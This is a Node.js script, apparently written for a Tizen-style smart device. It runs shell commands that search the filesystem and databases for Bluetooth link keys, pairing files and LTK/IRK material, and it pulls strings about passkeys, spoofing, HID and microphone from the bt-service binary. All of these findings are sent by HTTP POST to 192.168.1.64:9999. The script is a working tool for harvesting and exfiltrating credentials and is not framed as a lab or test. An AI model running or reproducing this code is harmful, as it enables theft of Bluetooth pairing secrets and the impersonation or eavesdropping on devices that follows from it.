"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body, cb) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); if (cb) cb(null); });
    req.on("error", function (e) { console.log("post err " + path + " " + e.message); if (cb) cb(e); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 10000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

function stringsOf(buf, minLen) {
    var out = [];
    var cur = "";
    for (var i = 0; i < buf.length; i++) {
        var c = buf[i];
        if (c >= 32 && c < 127) cur += String.fromCharCode(c);
        else { if (cur.length >= (minLen || 5)) out.push(cur); cur = ""; }
    }
    return out;
}

var out = {};
out.started = new Date().toISOString();
out.find_keys = sh("find /opt/var /var/lib /home/owner /opt/usr /opt/etc -maxdepth 5 \\( -iname '*linkkey*' -o -iname '*link_key*' -o -iname '*pairing*' -o -iname '*bt_key*' -o -iname '*irk*' -o -iname '*ltk*' \\) 2>/dev/null | head -25");
out.bt_dirs = sh("ls -laR /opt/var/lib/bluetooth /var/lib/bluetooth /opt/var/opt/bluetooth 2>/dev/null | head -30; echo ===; find /home/owner /opt/usr/apps /opt/usr/data -maxdepth 3 -iname '*bt*' -o -maxdepth 3 -iname '*bluetooth*' 2>/dev/null | head -25");
out.btservice = sh("ls -la /usr/bin/bt-service /usr/bin/bt-monitor 2>&1; ls -laR /opt/var/btservice /opt/var/bluetooth 2>/dev/null | head -20");
out.db_grep = sh("find /opt/var /home/owner -name '*.db' -size -5M 2>/dev/null | head -20 | while read f; do if grep -a -l -iE 'linkkey|link_key|7C:64:56' $f 2>/dev/null; then echo HIT:$f; fi; done");
out.btmon = sh("hciconfig -a 2>&1 | head -20; echo ===; btmgmt info 2>&1 | head -10");
post("/bt1", out);

var scan = {};
scan.started = out.started;
try {
    var buf = fs.readFileSync("/usr/bin/bt-service");
    var strs = stringsOf(buf, 6);
    var rx = /(link.?key|pairing|bond|auth|pin|passkey|7C:64|spoof|hid|HID|sco|SCO|mic|voice|audio)/i;
    var keep = [];
    for (var s = 0; s < strs.length && keep.length < 70; s++) {
        if (rx.test(strs[s])) keep.push(strs[s].slice(0, 130));
    }
    scan.btservice_size = buf.length;
    scan.hits = keep;
} catch (e) { scan.err = String(e.message || e); }
post("/bt2", scan);
post("/bt_done", { started: out.started });
